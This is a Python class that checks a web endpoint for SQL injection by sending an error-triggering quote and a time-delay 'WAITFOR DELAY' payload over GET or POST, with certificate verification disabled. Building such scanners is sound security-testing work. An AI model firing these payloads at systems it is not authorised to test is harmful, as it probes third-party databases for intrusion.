import requests
import time

class SQLInjectionValidator:
    def __init__(self, url, payload, method='GET', data=None, headers=None):
        self.url = url
        self.payload = payload
        self.method = method
        self.data = data or {}
        self.headers = headers or {}

    def validate(self):
        # Error-based
        error_payload = self.payload + "'"
        try:
            if self.method == 'GET':
                response = requests.get(f"{self.url}{error_payload}", headers=self.headers, verify=False)
            else: # POST
                post_data = self.data.copy()
                for key, value in post_data.items():
                    if 'PAYLOAD' in value:
                        post_data[key] = value.replace('PAYLOAD', error_payload)
                response = requests.post(self.url, headers=self.headers, data=post_data, verify=False)

            if "sql syntax" in response.text.lower() or "unclosed quotation mark" in response.text.lower():
                return {"vulnerable": True, "reason": "Error-based SQLi detected."}
        except requests.exceptions.RequestException:
            pass # Ignore connection errors for now

        # Time-based
        time_payload = self.payload + "'; WAITFOR DELAY '0:0:5'--"
        try:
            start_time = time.time()
            if self.method == 'GET':
                requests.get(f"{self.url}{time_payload}", headers=self.headers, verify=False)
            else: # POST
                post_data = self.data.copy()
                for key, value in post_data.items():
                    if 'PAYLOAD' in value:
                        post_data[key] = value.replace('PAYLOAD', time_payload)
                requests.post(self.url, headers=self.headers, data=post_data, verify=False)

            end_time = time.time()
            if end_time - start_time > 5:
                return {"vulnerable": True, "reason": "Time-based SQLi detected."}
        except requests.exceptions.RequestException:
            pass # Ignore connection errors for now

        return {"vulnerable": False, "reason": "No SQLi detected."}